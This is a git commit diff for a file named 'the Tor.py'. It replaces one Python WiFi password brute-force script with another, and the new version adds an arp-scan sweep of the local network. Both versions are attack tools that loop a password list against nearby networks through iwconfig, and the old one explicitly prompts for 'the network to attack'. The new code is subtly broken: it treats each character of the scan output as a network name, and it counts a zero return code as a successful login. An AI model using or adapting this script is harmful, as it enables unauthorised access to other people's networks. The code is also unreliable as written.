82a2939c74bd90db2eabc9567bc299888cd6e1ef
vIPERexe2 <148722243+vIPERexe2@users.noreply.github.com>
2023-11-01 19:09:15 +0200

    Update the bruteforcing.py

--- the Tor.py
+++ the Tor.py
@@ -1,48 +1,35 @@
 import os
 import subprocess
 
-def scan_networks():
-    # Use the 'iwlist' command to scan for available networks
-    scan_output = subprocess.check_output(['iwlist', 'wlan0', 'scan']).decode('utf-8')
+def lan_scan():
+    # Perform a LAN scan using the arp-scan command
+    subprocess.call(["arp-scan", "--localnet"])
 
-    # Extract the network names from the scan output
-    networks = []
-    lines = scan_output.split('\n')
-    for line in lines:
-        if 'ESSID' in line:
-            network = line.split(':')[1].strip().replace('"', '')
-            networks.append(network)
-
-    return networks
-
-def brute_force_password(network, password_file):
-    # Read the password file
-    with open(password_file, 'r') as file:
+def bruteforce_wifi_passwords(file_path):
+    # Read the file containing a list of passwords
+    with open(file_path, 'r') as file:
         passwords = file.readlines()
+    
+    # Remove newline characters from each password
+    passwords = [password.strip() for password in passwords]
+    
+    # Get the list of available WiFi networks
+    networks = subprocess.check_output(["iwlist", "wlan0", "scan"]).decode('utf-8')
+    
+    # Iterate over each network and try each password
+    for network in networks:
+        for password in passwords:
+            # Connect to the WiFi network using the current password
+            result = subprocess.call(["iwconfig", "wlan0", "essid", network, "key", password])
+            
+            # Check if the connection was successful
+            if result == 0:
+                print(f"Successfully connected to {network} with password: {password}")
+                return
+    
+    print("No WiFi network could be connected with the provided passwords.")
 
-    # Attempt to connect to the network using each password
-    for password in passwords:
-        password = password.strip()
-        command = f'iwconfig wlan0 essid "{network}" key "{password}"'
-        result = os.system(command)
-
-        if result == 0:
-            print(f'Success! Password found: {password}')
-            return
-
-    print('Password not found.')
-
-# Scan for available networks
-networks = scan_networks()
-print('Available networks:')
-for network in networks:
-    print(network)
-
-# Choose a network to attack
-network_to_attack = input('Enter the name of the network to attack: ')
-
-# Specify the password file
-password_file = input('Enter the path to the password file: ')
-
-# Perform the brute-force attack
-brute_force_password(network_to_attack, password_file)
+# Example usage
+file_path = "passwords.txt"
+lan_scan()
+bruteforce_wifi_passwords(file_path)
